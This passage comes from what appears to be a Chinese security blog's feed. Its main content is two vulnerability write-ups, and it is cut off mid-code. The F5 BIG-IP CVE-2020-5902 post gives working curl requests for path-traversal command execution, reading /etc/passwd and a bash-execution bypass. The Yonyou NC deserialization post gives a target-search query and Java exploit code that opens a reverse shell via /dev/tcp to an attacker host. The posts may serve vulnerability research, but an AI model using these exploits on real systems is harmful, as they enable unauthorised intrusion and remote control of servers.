jsdelivr"></a>4. jsdelivr</h2><p><strong>由于jsdelivr自带 50M 项目限制，所以全局加速是不现实的（此处项目较小的可以全局使用），建议只加速 JS、CSS 即可，下面只做理论介绍</strong></p><p>官网：<a href="https://www.jsdelivr.com/?docs=gh" target="_blank" rel="noopener">https://www.jsdelivr.com/?docs=gh</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962991108849.jpg" alt="-w1171"></p><ol><li><p>由于我配置了 hexo-lazyload-image，所以直接粗暴的修改源码（这里只对应 posts 文章内的静态资源），代价就是本地测试没法加载图片，有能力的可以写个测试和发布分别加载不同地址即可</p><p> 位置：<code>&lt;blog_path&gt;/node_modules/hexo-asset-image/index.js</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962992328798.jpg" alt="-w1087"></p></li><li><p>对应其他静态文件，如头像、二维码等，直接修改成绝对地址即可（不利于长期维护）</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962997100660.jpg" alt="-w692"></p></li></ol><p>P.S. 其实可以自定义在 config 中自定义一个开关和加载路径方便未来维护，这里有插件<a href="https://www.npmjs.com/package/hexo-cdn-jsdelivr" target="_blank" rel="noopener">hexo-cdn-jsdelivr</a>实现，本地测试没有问题但是generate时总会出错，可能和其他插件有冲突，我暂时没有去仔细研究</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.ops-coffee.cn/s/11-yhyohtdsbl9ffnvcs6w" target="_blank" rel="noopener">https://blog.ops-coffee.cn/s/11-yhyohtdsbl9ffnvcs6w</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;快快快，冲冲冲~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike 破解步骤</title>
    <link href="https://blog.sari3l.com/posts/76ce816c/"/>
    <id>https://blog.sari3l.com/posts/76ce816c/</id>
    <published>2020-07-31T02:51:55.000Z</published>
    <updated>2020-08-04T09:29:03.116Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="74bf7c74f19487e94d2590775d226ded1355b2ff5113380d34592df650af83b0"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Pentest" scheme="https://blog.sari3l.com/categories/Pentest/"/>
    
    
      <category term="cobaltstirke" scheme="https://blog.sari3l.com/tags/cobaltstirke/"/>
    
  </entry>
  
  <entry>
    <title>一道题回顾智能合约 Coverage</title>
    <link href="https://blog.sari3l.com/posts/b7ea5c49/"/>
    <id>https://blog.sari3l.com/posts/b7ea5c49/</id>
    <published>2020-07-13T08:32:42.000Z</published>
    <updated>2020-07-13T08:35:07.429Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="cd56c455c979df0526c2908038fd59da4ffd1ebfcbf9e79bda8b9308b75cbe0f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Pentest" scheme="https://blog.sari3l.com/categories/Pentest/"/>
    
    
      <category term="智能合约" scheme="https://blog.sari3l.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>F5 BIG-IP RCE简单分析</title>
    <link href="https://blog.sari3l.com/posts/58a67794/"/>
    <id>https://blog.sari3l.com/posts/58a67794/</id>
    <published>2020-07-06T02:45:39.000Z</published>
    <updated>2020-07-08T07:00:40.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从通告中可以明确几个点</p><ol><li>位于 tmui</li><li><code>..;</code>路径穿透 -&gt; Apache Tomcat</li><li>隐藏页面</li></ol><p>虚拟机中提取源码并简单分析后可以确定jsp对应class位于</p><pre class=" language-shell"><code class="language-shell"># 相对路径/www/tmui/WEB-INF/classes/org/apache/jsp/tmui# 绝对路径/usr/local/www/tmui/WEB-INF/classes/org/apache/jsp/tmui</code></pre><p>最后在 locallb/workspace 中可以看到有以下几个关键类</p><table><thead><tr><th>class</th><th>jsp path</th><th>feature</th><th>parameter</th></tr></thead><tbody><tr><td>create_jsp.class</td><td>/tmui/locallb/workspace/list.jsp</td><td>创建 jsp 文件</td><td></td></tr><tr><td>dbquery_jsp.class</td><td>/tmui/locallb/workspace/dbquery.jsp</td><td>查询数据库</td><td>query<br>object<br>column</td></tr><tr><td>directoryList_jsp.class</td><td>/tmui/locallb/workspace/directoryList.jsp</td><td>列目录</td><td>directoryPath</td></tr><tr><td>fileRead_jsp.class</td><td>/tmui/locallb/workspace/fileRead.jsp</td><td>读文件</td><td>fileName</td></tr><tr><td>fileSave_jsp.class</td><td>/tmui/locallb/workspace/fileSave.jsp</td><td>写文件</td><td>fileName<br>content</td></tr><tr><td>import_jsp.class</td><td>/tmui/locallb/workspace/import.jsp</td><td>加载 jsp 文件</td><td></td></tr><tr><td>list_jsp.lass</td><td>/tmui/locallb/workspace/list.jsp</td><td>列数据库信息</td><td></td></tr><tr><td>properties_jsp.class</td><td>/tmui/locallb/workspace/properties.jsp</td><td>参数设定</td><td>pageType<br>properties</td></tr><tr><td>settings_jsp.class</td><td>/tmui/locallb/workspace/settings.jsp</td><td>列举参数信息</td><td></td></tr><tr><td>tmshCmd_jsp.class</td><td>/tmui/locallb/workspace/tmshCmd.jsp</td><td>命令执行</td><td>command</td></tr></tbody></table><p>对应<code>com.f5.tmui.locallb.handler.workspace.WorkspaceUtils</code>中的方法实现</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/58a67794/15940163972331.jpg" alt></p><p>在浏览器中直接访问加载这些页面会被重定向，但通过 tomcat 路径穿透可以控制在 tmui 下进行加载</p><p>然后这里说下 tmshCmd 执行的问题</p><p>在<code>com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand</code>中执行传入的 command，但限制可用的操作为<code>create</code>、<code>delete</code>、<code>list</code>、<code>modify</code>四种模块，且由于<code>checkForBadShellCharacters</code>进行了过滤，需要找到方法跳出限制通过<a href="https://clouddocs.f5.com/cli/tmsh-reference/v13/commands/run.html" target="_blank" rel="noopener"><code>run</code>模块</a>执行 bash 命令</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> JSONObject <span class="token function">runTmshCommand</span><span class="token punctuation">(</span>String command<span class="token punctuation">)</span> <span class="token punctuation">{</span>    F5Logger logger <span class="token operator">=</span> <span class="token punctuation">(</span>F5Logger<span class="token punctuation">)</span>F5Logger<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>WorkspaceUtils<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    JSONObject resultObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    String error <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    String operation <span class="token operator">=</span> command<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ShellCommandValidator<span class="token punctuation">.</span><span class="token function">checkForBadShellCharacters</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"create"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"delete"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"list"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"modify"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        error <span class="token operator">=</span> NLSEngine<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ilx.workspace.error.RejectedTmshCommand"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>            Result result <span class="token operator">=</span> Syscall<span class="token punctuation">.</span><span class="token function">callElevated</span><span class="token punctuation">(</span>Syscall<span class="token punctuation">.</span>TMSH<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>            output <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            error <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CallException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{</span>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>NLSEngine<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ilx.workspace.error.TmshCommandFailed"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            error <span class="token operator">=</span> var8<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    resultObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>    resultObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> resultObject<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>过滤函数<code>com.f5.form.ShellCommandValidator#checkForBadShellCharacters</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkForBadShellCharacters</span><span class="token punctuation">(</span>String value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cArray <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> cArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'&amp;'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">';'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'`'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\''</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'"'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'|'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'?'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'~'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'&lt;'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'>'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'^'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'['</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">']'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'{'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'}'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'$'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>RCE： <a href="https://clouddocs.f5.com/cli/tmsh-reference/v13/commands/" target="_blank" rel="noopener">TMSH 命令参考</a></p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'</code></pre><p>P.S. 实际这里的 RCE 在没绕过限制之前只是对于 F5 执行部分操作；另外说<code>list auth user admin</code>返回结果为空，那是因为 admin 处于未登录状态。</p><p>LFR:</p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'</code></pre><p>DIR：</p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/'</code></pre><p>…</p><h2 id="RCE-限制绕过"><a href="#RCE-限制绕过" class="headerlink" title="RCE 限制绕过"></a>RCE 限制绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>来自不知源分享</p><ol><li><p>修改alias劫持list命令为bash</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</code></pre></li><li><p>写入bash文件</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&amp;content=id</code></pre></li><li><p>执行bash文件</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx</code></pre></li><li><p>还原list命令</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></pre></li></ol><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p><a href="https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4</a></p><h2 id="修补·反序列化绕过"><a href="#修补·反序列化绕过" class="headerlink" title="..;修补·反序列化绕过"></a><code>..;</code>修补·反序列化绕过</h2><p>原理：<a href="https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/" target="_blank" rel="noopener">https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/</a><br>POC：<a href="https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/" target="_blank" rel="noopener">https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://nosec.org/home/detail/4501.html" target="_blank" rel="noopener">【安全通报】F5 BIG-IP 远程代码执行漏洞</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;..;&lt;/code&gt; ? :)&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="F5" scheme="https://blog.sari3l.com/tags/F5/"/>
    
      <category term="CVE-2020-5902" scheme="https://blog.sari3l.com/tags/CVE-2020-5902/"/>
    
  </entry>
  
  <entry>
    <title>用友NC反序列化 简单分析</title>
    <link href="https://blog.sari3l.com/posts/608d18f0/"/>
    <id>https://blog.sari3l.com/posts/608d18f0/</id>
    <published>2020-06-17T05:21:18.000Z</published>
    <updated>2020-07-06T09:45:04.075Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p></blockquote><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="jwdp"><a href="#jwdp" class="headerlink" title="jwdp"></a>jwdp</h3><p>UClient 提供了 JVM 参数设置，在里面直接添加</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923660011340.jpg" alt="-w919"></p><p>或者在其目录下的 client.sec 中直接修改</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923662221799.jpg" alt="-w1021"></p><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>注：本文只测试了6.5版本</p><p>fofa：<a href="https://fofa.so/result?qbase64=dGl0bGU9IllPTllPVSBOQyI%3D" target="_blank" rel="noopener">title=”YONYOU NC”</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>通过已有的资料，在nc.login.ui.LoginAssistant中有以下两点调用lookup</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923664561365.jpg" alt="-w1009"></p><p>最终由nc.bs.framework.rmi.RmiNCLocator#lookup，注意到是 remoteContext，所以这里是类似 RMI 利用中的 <strong>Client 通过向 RMI Registry 申请 lookup 操作进行序列化攻击</strong></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923665837519.jpg" alt="-w692"></p><p>后面就进入到常规操作了，最后放下调用栈</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923679776836.jpg" alt="-w553"></p><p>注意，利用时候首先确定服务器 jdk 版本来确定 payload，可以直接先打向 ceye 或 dnslog.cn，在UA中会标明版本</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923716683106.jpg" alt="-w1453"></p><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>common<span class="token punctuation">.</span>NCLocator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span>String url<span class="token punctuation">,</span> String jndipath<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Properties env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"SERVICEDISPATCH_URL"</span><span class="token punctuation">,</span> url <span class="token operator">+</span> <span class="token string">"/ServiceDispatcherServlet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        NCLocator locator <span class="token operator">=</span> NCLocator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        locator<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>jndipath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">attack</span><span class="token punctuation">(</span><span class="token string">"http://target"</span><span class="token punctuation">,</span> <span class="token string">"ldap://ip:port/classname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>远程编译部署</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Name<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>ObjectFactory<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sh -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>当然也可以选择利用 nc 自带的类进行远程部署利用</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>common<span class="token punctuation">.</span>ComponentMetaVO<span class="token punctuation">;</span><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteAddressSelector<span class="token punctuation">;</span><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteProxy<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span> <span class="token keyword">implements</span> <span class="token class-name">RemoteProxy</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sh -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getAttribute</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAttribute</span><span class="token punctuation">(</span>String s<span class="token punctuation">,</span> Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ComponentMetaVO <span class="token function">getComponentMetaVO</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getRetryMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRetryMax</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getRetryInterval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span 